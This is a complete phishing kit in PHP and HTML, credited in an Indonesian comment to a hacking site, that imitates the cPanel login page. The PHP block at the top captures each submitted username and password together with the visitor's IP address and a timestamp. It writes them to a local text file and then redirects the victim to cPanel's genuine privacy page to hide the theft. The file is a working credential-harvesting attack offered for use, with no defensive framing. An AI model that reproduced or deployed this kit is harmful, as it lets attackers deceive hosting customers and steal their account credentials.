<?php

//Phising Cpanel 
//By Magelang1337.com
//Untuk tutorial Lainnya silahkan kunjungi www.magelang133.com

if($_POST){
	$user = $_POST["user"];
	$pass = $_POST["pass"];
	$ip = $_SERVER['REMOTE_ADDR'];
	date_default_timezone_set('Asia/Jakarta');  
	$cur_time = date("d-m-Y H:i:s");
	$file = fopen('hasil.txt', 'a'); 
	fwrite($file, $user."<-----Username+Passwrd-----> " .$pass. "   Ip Address: " .$ip. "   Tanggal: " .$cur_time.  "\n\n");
	fclose($file);
	header("Location:https://cpanel.net/privacy-policy/");
}
?>
<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="google" content="notranslate" />
    <meta name="apple-itunes-app" content="app-id=1188352635" />
    <title>cPanel Login</title>
    <link rel="shortcut icon" href="./cp-logo.svg" type="image/x-icon" />

    <!-- EXTERNAL CSS -->
    <link href="./open_sans.min.css" rel="stylesheet" type="text/css" />
    <link href="./style_v2_optimized.css" rel="stylesheet" type="text/css" />
    <!--[if IE 6]>
    <style type="text/css">
        img {
            behavior: url(/cPanel_magic_revision_1551114390/unprotected/cp_pngbehavior_login.htc);
        }
    </style>
    <![endif]-->
</head>
<body class="cp">


<!-- Do not remove msg_code as it is needed for automated testing - msg_code:[]  -->
<div id="login-wrapper" class="group ">
    <div class="wrapper">
    <div id="content-container">
        <div id="login-container">

            <div id="login-sub-container">
                    <div id="login-sub-header">
                        
                        <img class="main-logo" src="./cpanel-logo.svg" alt="logo" />
                        
                    </div>
                    <div id="login-sub"
                                                >
                        <div id="clickthrough_form" style="visibility:hidden">
                            <form action="javascript:void(0)">
                                <div class="notices"></div>
                                <button type="submit" class="clickthrough-cont-btn">Continue</button>
                            </form>
                        </div>
                        <div id="forms">
                            <form novalidate id="login_form" method="post" target="_top" style="visibility:">
                                <div class="input-req-login"><label for="user">Username</label></div>
                                <div class="input-field-login icon username-container">
                                    <input name="user" id="user" autofocus="autofocus" value="" placeholder="Enter your username." class="std_textbox" type="text"  tabindex="1" required>
                                </div>
                                <div class="input-req-login login-password-field-label"><label for="pass">Password</label></div>
                                <div class="input-field-login icon password-container">
                                    <input name="pass" id="pass" placeholder="Enter your account password." class="std_textbox" type="password" tabindex="2"  required>
                                </div>
                                <div class="controls">
                                    <div class="login-btn">
                                        <button name="login" type="submit" id="login_submit" tabindex="3">Log in</button>
                                    </div>

                                                                    </div>
                                <div class="clear" id="push"></div>
                            </form>
                        <!--CLOSE forms -->
                        </div>
                    <!--CLOSE login-sub -->
                    </div>
                    

                                    <!--CLOSE wrapper -->
                </div>
            <!--CLOSE login-sub-container -->
            </div>
        <!--CLOSE login-container -->
        </div>
        
                <div id="locale-footer">
            <div class="locale-container">
                <noscript>
                    <form method="get" action=".">
                        <select name="locale">
                            <option value="">Change locale</option>
                            <option value='ar'>العربية</option><option value='bg'>български</option><option value='cs'>čeština</option><option value='da'>dansk</option><option value='de'>Deutsch</option><option value='el'>Ελληνικά</option><option value='es'>español</option><option value='es_419'>español latinoamericano</option><option value='es_es'>español de España</option><option value='fi'>suomi</option><option value='fil'>Filipino</option><option value='fr'>français</option><option value='he'>עברית</option><option value='hu'>magyar</option><option value='i_cpanel_snowmen'>☃ cPanel Snowmen ☃ - i_cpanel_snowmen</option><option value='id'>Bahasa Indonesia</option><option value='it'>italiano</option><option value='ja'>日本語</option><option value='ko'>한국어</option><option value='ms'>Bahasa Melayu</option><option value='nb'>norsk bokmål</option><option value='nl'>Nederlands</option><option value='no'>Norwegian</option><option value='pl'>polski</option><option value='pt'>português</option><option value='pt_br'>português do Brasil</option><option value='ro'>română</option><option value='ru'>русский</option><option value='sl'>slovenščina</option><option value='sv'>svenska</option><option value='th'>ไทย</option><option value='tr'>Türkçe</option><option value='uk'>українська</option><option value='vi'>Tiếng Việt</option><option value='zh'>中文</option><option value='zh_cn'>中文（中国）</option><option value='zh_tw'>中文（台湾）</option>                        </select>
                        <button style="margin-left: 10px" type="submit">Change</button>
                    </form>
                    <style type="text/css">#mobilelocalemenu, #locales_list {display:none}</style>
                </noscript>
                <ul id="locales_list">
                    
                        
                        <li><a>العربية</a></li>
                    
                        
                        <li><a>български</a></li>
                    
                        
                        <li><a>čeština</a></li>
                    
                        
                        <li><a>dansk</a></li>
                    
                        
                        <li><a>Deutsch</a></li>
                    
                        
                        <li><a>Ελληνικά</a></li>
                    
                        
                        <li><a>español</a></li>
                    
                        
                        <li><a>español&nbsp;latinoamericano</a></li>
                    
                        
                    <li><a href="javascript:void(0)" id="morelocale" onclick="toggle_locales(true)" title="More locales">…</a></li>
                </ul>
            </div>
        </div>
    </div>
<!--Close login-wrapper -->
</div>
<style>
    @media (min-width: 481px) {
        #select_user_form {
            width: px;
        }
    }
</style>
	
    <div class="copyright"><img src="./cp-logo.svg" width="50px;">
	<br>
	Copyright© 2019 cPanel, Inc.
    <br /><a href="https://go.cpanel.net/privacy" target="_blank">Privacy Policy</a></div>

</body>

</html>

